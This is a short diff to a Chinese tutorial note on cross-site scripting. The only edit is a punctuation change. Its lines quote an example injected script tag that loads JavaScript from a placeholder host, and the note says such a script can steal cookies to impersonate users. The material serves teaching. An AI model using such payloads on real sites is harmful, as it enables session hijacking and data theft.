@@ -1,7 +1,7 @@
 ## XSS 跨站脚本攻击
 
 即注入脚本到页面，为所欲为。例如当后台的html模板为`<div>#{content}</div>`,而其中的content正好是我们前台传递过来的url的参数，
-这时如果我们传入的url参数为一个脚本，例如`<script src='http://xxx.xxx.xx/index.js'></script>`这个时候我们就可以在这注入的脚本里面为所欲为，
+这时如果我们传入的url参数为一个脚本，例如`<script src='http://xxx.xxx.xx/index.js'></script>`这个时候我们就可以在这注入的脚本里面为所欲为。
 如盗用cookies进而冒充登陆,盗取数据等等。
 
 跨站攻击有几种分类:
